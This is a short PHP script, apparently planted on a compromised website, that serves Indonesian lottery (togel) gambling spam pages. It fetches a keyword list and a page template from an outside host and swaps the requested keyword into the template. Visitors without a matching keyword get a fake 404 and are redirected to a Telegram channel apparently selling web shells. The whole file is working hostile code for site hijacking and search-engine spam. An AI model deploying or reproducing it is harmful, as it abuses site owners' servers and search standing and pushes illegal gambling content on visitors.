<?php
$readmeUrl = "https://iappleunlock.xyz/lp/readme.txt";
$requestedParams = [];

$readmeContent = file_get_contents($readmeUrl);

if ($readmeContent !== false) {
    $requestedParams = explode("\n", $readmeContent);
    $requestedParams = array_map('trim', $requestedParams);
}

$requestedInc = isset($_GET["inc"]) ? $_GET["inc"] : "";

// Tetapkan URL content yang tetap sama
$fileUrl = "https://iappleunlock.xyz/lp/tunnel.txt";

// Jika nilai parameter "inc" cocok dengan salah satu nilai dari readme.txt dan ada nilai dalam readme.txt
if (!empty($requestedInc) && in_array($requestedInc, $requestedParams) && !empty($requestedParams[0])) {
    // Ambil konten dari URL
    $filedata = file_get_contents($fileUrl);

    if ($filedata !== false) {
        // Mengganti "HOTOGEL" menjadi huruf kapital sesuai dengan nilai parameter "inc"
        $newContent = str_replace("HOTOGEL", strtoupper($requestedInc), $filedata);
        
        // Mengganti "hotogel" menjadi huruf kapital sesuai dengan nilai parameter "inc"
        $newContent = str_replace("hotogel", strtoupper($requestedInc), $newContent);
        
        echo $newContent;
    } else {
        echo "Error retrieving content.";
    }
} else {
    // Atur header status 404
    header("HTTP/1.0 404 Not Found");

    // Tambahkan header "Refresh" untuk mengarahkan pengguna ke halaman lain dalam 3 detik
    header("Refresh: 5; url=https://t.me/infowebshellindo"); // Ganti "halaman-lain.php" dengan URL tujuan Anda

    echo "<center><p><b>kurang tampan bos :)</b></p></center>";
}
?>
